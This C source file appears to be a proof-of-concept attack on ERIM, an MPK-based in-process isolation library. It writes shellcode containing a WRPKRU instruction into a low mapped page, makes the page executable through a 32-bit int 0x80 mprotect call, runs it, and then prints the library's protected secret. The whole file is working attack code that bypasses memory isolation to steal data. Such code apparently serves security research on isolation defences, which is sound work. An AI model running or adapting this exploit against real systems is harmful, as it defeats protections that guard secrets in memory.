#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <erim.h>

#include "secure_lib.h"


int main(int argc, char **argv) {
    secure_lib_init();
    secure_lib_print_secret();


    // must map below 2^32
    void *page = mmap((void*)0x1000000, 4096, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);

    printf("mapped page at %p\n", page);

    unsigned char unlock[128] = {
        0x50, 0x52, 0x51, // push rax, rdx, rcx
        0x31, 0xc9,  // xor ecx, ecx
        0x31, 0xd2,  // xor edx, edx
        0xb8, 0x50, 0x55, 0x55, 0x55, // mov eax,0x55555550
        0x0f, 0x01, 0xef, // wrpku
        0x59, 0x5a, 0x58, // pop rcx, rdx, rax
        0xc3, // ret
        0
    };

    memcpy(page, unlock, sizeof(unlock));

    printf("calling 32-bit mprotect\n");

    __asm__ __volatile__(
        "mov $0x7d, %%rax\n"
        "mov %0, %%rbx\n"
        "mov $4096, %%rcx\n"
        "mov $5, %%rdx\n"
        "int $0x80"
        :
        : "r" (page)
        : "rax", "rbx", "rcx", "rdx"
    );

    void (*fun_ptr)(void) = page;
    fun_ptr();

    fprintf(stderr, "successfully executed mapped page again\n");
    fprintf(stderr, "TRYING TO STEAL THE SECRET: %s\n", secure_lib_secret);

    return 0;
}

